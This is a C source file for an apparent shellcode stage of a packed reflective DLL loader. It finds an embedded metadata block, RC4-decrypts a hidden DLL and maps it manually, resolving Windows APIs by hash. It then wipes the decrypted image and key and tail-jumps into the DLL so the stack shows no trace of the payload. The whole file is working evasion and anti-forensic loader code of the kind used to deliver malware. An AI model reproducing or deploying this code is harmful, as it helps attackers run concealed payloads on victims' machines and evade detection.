#include "framework.h"
#include "headers.h"
#include "payload.h"
#include "pe_loader.h"
#include "rc4.h"
#include "ldr.h"
#include "api_hash.h"

/*
 * Executing entry point of the packed payload.
 *
 * Difference from entrypoint_packed: this one does not return. It maps the
 * image, wipes the payload (the decrypted DLL copy and the RC4 key), writes the
 * payload info where the DLL can find it and then jumps into the image entry
 * point. The DLL is therefore responsible for releasing the payload region.
 *
 * The reason for the jump is the wipe: a "call" would push a return address
 * that points into the memory being wiped, so the stack would advertise where
 * the payload had been, and returning through it would run freed bytes.
 *
 * Like pe_loader.c this file is compiled into the shellcode, so it must contain
 * no string literals and no global or static data. In particular there is no
 * memset here: the wipe uses the local loop below.
 */

/* Provided by get_rip.asm: the address just after the call, inside this code. */
extern PBYTE rfdll_get_rip(void);

/* Provided by get_rip.asm: the caller's stack pointer, for measuring the frame. */
extern PBYTE rfdll_get_rsp(void);

/* Provided by tail_jump.asm: enters the image entry point and never returns.
   The declaration lives in payload.h, which is included above. */

/*
 * First page boundary at or after "address". The metadata sits on a page
 * boundary, so the scan only has to look at page aligned addresses.
 */
static PBYTE rfdll_exec_next_page(PBYTE address)
{
	return (PBYTE)(((UINT64)address + (RFDLL_PAGE_SIZE - 1)) & ~(UINT64)(RFDLL_PAGE_SIZE - 1));
}

/*
 * Locate the metadata by scanning forward, bounded by RFDLL_EXEC_SCAN_LIMIT and
 * by the end of the committed region that holds the payload.
 *
 * region_base/region_limit receive the whole region, so the caller can wipe it
 * afterwards; both are NULL/0 when VirtualQuery could not tell.
 */
static PRFDLL_META rfdll_exec_find_meta(PBYTE start, PBYTE* region_base, PBYTE* region_limit)
{
	PBYTE cursor = NULL;
	PBYTE end = NULL;
	HMODULE kernel32 = NULL;
	fnVirtualQuery virtual_query = NULL;
	MEMORY_BASIC_INFORMATION memory_info;
	DWORD scanned = 0;

	*region_base = NULL;
	*region_limit = NULL;

	kernel32 = GMHR_Hash(HASH_KERNEL32);
	if (kernel32 != NULL)
	{
		virtual_query = (fnVirtualQuery)GPAR_Hash(kernel32, HASH_VIRTUALQUERY);
	}

	cursor = rfdll_exec_next_page(start);
	end = cursor + RFDLL_SCAN_LIMIT;

	if (virtual_query != NULL)
	{
		/*
		 * Ask about the page the code itself sits on. VirtualQuery then reports
		 * the allocation that page belongs to, and AllocationBase is what
		 * VirtualFree needs; BaseAddress would be the base of the region the
		 * queried page falls in, which is not necessarily the same thing.
		 *
		 * The address must be inside the payload: subtracting a page from the
		 * first page boundary would step outside it whenever "start" is already
		 * page aligned, which is why the code's own page is queried instead.
		 */
		if (virtual_query((LPCVOID)start, &memory_info, sizeof(memory_info)) == sizeof(memory_info))
		{
			PBYTE region_end = (PBYTE)memory_info.BaseAddress + memory_info.RegionSize;

			*region_base = (PBYTE)memory_info.AllocationBase;
			*region_limit = region_end;

			if (region_end > cursor && region_end < end)
				end = region_end;
		}
	}

	if (end <= cursor)
		return NULL;

	for (scanned = 0; (PBYTE)(cursor + scanned) < end; scanned += RFDLL_PAGE_SIZE)
	{
		PRFDLL_META candidate = (PRFDLL_META)(cursor + scanned);

		/* Compared against immediates so that no global constant is needed. */
		if (*(DWORD*)candidate->magic == RFDLL_MAGIC_LO &&
			*(DWORD*)(candidate->magic + 4) == RFDLL_MAGIC_HI)
		{
			return candidate;
		}
	}

	return NULL;
}

/*
 * Validate the metadata, then decrypt the image in place.
 *
 * Mirrors rfdll_open_payload in loader_packed.c. A missing region limit refuses
 * the payload rather than decrypting without a bound.
 */
static BOOL rfdll_exec_open_payload(PRFDLL_META meta, PRFDLL_PAYLOAD payload, PBYTE region_limit)
{
	PBYTE image = NULL;
	PBYTE payload_end = NULL;

	if (region_limit == NULL)
		return FALSE;

	if (meta->version != RFDLL_META_VERSION)
		return FALSE;
	if (meta->dll_size < sizeof(IMAGE_DOS_HEADER) || meta->dll_size > RFDLL_MAX_IMAGE_SIZE)
		return FALSE;
	if ((meta->flags & ~RFDLL_FLAG_HEADERS_STRIPPED) != 0)
		return FALSE;
	if (meta->key_length > RFDLL_MAX_KEY_LENGTH)
		return FALSE;

	image = (PBYTE)meta + RFDLL_META_HEADER_SIZE + meta->key_length;
	payload_end = image + meta->dll_size;

	if (payload_end > region_limit || payload_end < image)
		return FALSE;

	payload->meta = meta;
	payload->image = image;
	payload->image_size = meta->dll_size;
	payload->key = (const BYTE*)meta + RFDLL_META_HEADER_SIZE;
	payload->key_length = meta->key_length;
	payload->host_hash = meta->host_hash;
	payload->headers_stripped = (meta->flags & RFDLL_FLAG_HEADERS_STRIPPED) != 0;

	/*
	 * The image is about to be wiped along with everything else left in the
	 * payload, so it has to be copied out first: the mapped image is what
	 * survives, the bytes here are about to be overwritten. Mapping straight
	 * from this buffer would map the file, and the wipe would then destroy the
	 * only copy of it.
	 *
	 * RC4 both encrypts and decrypts, so this turns the ciphertext into the PE.
	 */
	if (payload->key_length != 0)
	{
		rfdll_rc4(image, payload->image_size, payload->key, payload->key_length);
	}

	return TRUE;
}

/*
 * Overwrite a range with zeroes. Not memset: that would be a CRT call, and the
 * volatile accesses keep the compiler from turning the loop back into one.
 */
static void rfdll_exec_wipe(PVOID address, SIZE_T size)
{
	volatile BYTE* cursor = (volatile BYTE*)address;
	SIZE_T index = 0;

	if (address == NULL || size == 0)
		return;

	for (index = 0; index < size; index++)
		cursor[index] = 0;
}

/*
 * Copy the image into memory this loader owns, leaving the payload as the source
 * that is about to be wiped.
 *
 * The copy is made through VirtualAlloc so that the mapped image never aliases
 * the payload region: the wipe has to be able to destroy the payload bytes
 * without touching the PE that is being mapped from them.
 */
static PBYTE rfdll_exec_copy_image(PRFDLL_PAYLOAD payload, fnVirtualAlloc virtual_alloc)
{
	PBYTE copy = NULL;
	SIZE_T index = 0;
	volatile BYTE* destination = NULL;
	const BYTE* source = payload->image;

	if (virtual_alloc == NULL)
		return NULL;

	copy = (PBYTE)virtual_alloc(NULL, payload->image_size, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	if (copy == NULL)
		return NULL;

	/* Byte copy: the region may overlap nothing, but a DWORD copy would need
	   alignment guarantees that the payload does not offer. */
	destination = (volatile BYTE*)copy;
	for (index = 0; index < payload->image_size; index++)
		destination[index] = source[index];

	return copy;
}

/*
 * Hook called by rfdll_prepare_image before the page protections are applied.
 *
 * The payload info goes at a fixed offset inside the image header area, and the
 * header page is made read-only right after this hook returns, so this is the
 * only window in which the write can happen. The context is the structure to
 * copy in.
 */
static void rfdll_exec_info_hook(PBYTE image_base, DWORD image_size, PVOID context)
{
	RFDLL_PAYLOAD_INFO* source = (RFDLL_PAYLOAD_INFO*)context;
	PRFDLL_PAYLOAD_INFO destination = NULL;

	if (image_base == NULL || source == NULL)
		return;

	source->image_base = image_base;
	source->image_size = image_size;

	/*
	 * The fixed offset lives inside the DOS stub area, which only exists as
	 * scratch space when the packer stripped the headers. Refuse to write over
	 * a real header instead of corrupting an image that still has one.
	 */
	if (image_size <= RFDLL_PAYLOAD_INFO_OFFSET + RFDLL_PAYLOAD_INFO_SIZE)
		return;

	destination = (PRFDLL_PAYLOAD_INFO)(image_base + RFDLL_PAYLOAD_INFO_OFFSET);

	/* Field by field: no CRT memcpy in the shellcode. */
	destination->magic = source->magic;
	destination->version = source->version;
	destination->payload_base = source->payload_base;
	destination->payload_size = source->payload_size;
	destination->image_base = source->image_base;
	destination->image_size = source->image_size;
	destination->host_hash = source->host_hash;
	destination->flags = source->flags;
}

/*
 * The real work, entered from entry_exec.asm with the stack pointer of the
 * payload's caller. Not static because that assembly entry jumps to it by name,
 * and it is the only caller: nothing else should run this.
 */
void rfdll_exec_run(PBYTE caller_stack)
{
	PBYTE self = NULL;
	PBYTE region_base = NULL;
	PBYTE region_limit = NULL;
	PRFDLL_META meta = NULL;
	RFDLL_PAYLOAD payload;
	PBYTE copy = NULL;
	PBYTE image_base = NULL;
	DWORD entry_rva = 0;
	DWORD image_size = 0;
	BOOL needs_delete_table = FALSE;
	HMODULE kernel32 = NULL;
	fnVirtualAlloc virtual_alloc = NULL;
	fnVirtualFree virtual_free = NULL;
	SIZE_T payload_size = 0;
	RFDLL_PAYLOAD_INFO info;

	self = rfdll_get_rip();
	if (self == NULL)
		return;


	meta = rfdll_exec_find_meta(self, &region_base, &region_limit);
	if (meta == NULL)
		return;


	if (!rfdll_exec_open_payload(meta, &payload, region_limit))
		return;


	/* Resolve what the copy and the wipe need before anything is changed. */
	kernel32 = GMHR_Hash(HASH_KERNEL32);
	if (kernel32 == NULL)
		return;
	virtual_alloc = (fnVirtualAlloc)GPAR_Hash(kernel32, HASH_VIRTUALALLOC);
	virtual_free = (fnVirtualFree)GPAR_Hash(kernel32, HASH_VIRTUALFREE);
	if (virtual_alloc == NULL || virtual_free == NULL)
		return;


	/*
	 * Map from a copy, so that the wipe below can destroy the payload without
	 * destroying the PE being mapped. The info structure is filled in first and
	 * handed to the hook, which writes it into the image before the page
	 * protections are applied (the header page is read-only afterwards, so
	 * there is no later chance to write there).
	 */
	payload_size = 0;
	if (region_base != NULL && region_limit != NULL && region_limit > region_base)
		payload_size = (SIZE_T)(region_limit - region_base);

	info.magic = RFDLL_PAYLOAD_INFO_MAGIC;
	info.version = RFDLL_PAYLOAD_INFO_VERSION;
	info.payload_base = region_base;
	info.payload_size = payload_size;
	info.image_base = NULL;		/* filled in by the hook, once the base is known */
	info.image_size = 0;
	info.host_hash = payload.host_hash;

	/*
	 * This entry point wipes the payload and cannot free it, because it is
	 * still running from that region when it leaves, so the payload is asked
	 * to release it.
	 */
	info.flags = RFDLL_PAYLOAD_FLAG_FREE_BY_DLL;

	copy = rfdll_exec_copy_image(&payload, virtual_alloc);
	if (copy == NULL)
		return;


	image_base = rfdll_prepare_image(copy, payload.image_size, &entry_rva,
		&image_size, &needs_delete_table, rfdll_exec_info_hook, &info);



	/* The copy has served its purpose either way. */
	if (copy != NULL)
		virtual_free(copy, 0, MEM_RELEASE);
	copy = NULL;

	if (image_base == NULL || entry_rva == 0)
		return;

	/*
	 * Wipe what has to disappear: the decrypted PE image, the RC4 key and the
	 * metadata that sits between them. The loader code itself is deliberately
	 * left alone, because this function is still executing from it and zeroing
	 * it would pull the ground out from under the jump below.
	 *
	 * The image was mapped from a private copy, so destroying these bytes does
	 * not affect the running image.
	 */
	{
		PBYTE secret_start = (PBYTE)payload.meta;
		SIZE_T secret_size = (SIZE_T)((payload.image + payload.image_size) - secret_start);


		/* Sanity: never wipe the code, whatever the metadata claims. */
		if (secret_start > self && secret_size != 0 &&
			(payload.image + payload.image_size) > secret_start)
		{
			rfdll_exec_wipe(secret_start, secret_size);
		}
	}

	/*
	 * Leave for good. lpReserved points at the copy inside the mapped image,
	 * which the payload can free along with the region; nothing handed to the
	 * payload lives in this abandoned frame.
	 *
	 * The stack pointer captured on entry is restored, not a guessed frame
	 * size: that puts RSP exactly where the payload's caller left it, so the
	 * image entry point starts at a normal function entry and returns into the
	 * caller. An earlier attempt assumed a fixed 0x78 byte frame while the
	 * compiler used 0x118, which left RSP misaligned and faulted inside ntdll.
	 */


	/*
	 * caller_stack is the stack pointer the payload's caller had at its call,
	 * read by entry_exec.asm before any frame existed. Restoring it makes the
	 * image entry point run exactly where this function would have: the DLL's
	 * frame goes below it and its ret consumes the caller's return address, so
	 * control returns to whoever called the payload while nothing in the payload
	 * is left on the stack.
	 */
	rfdll_tail_jump(image_base, (PVOID)(image_base + RFDLL_PAYLOAD_INFO_OFFSET),
		image_base + entry_rva, caller_stack);
	kernel32 = NULL;
}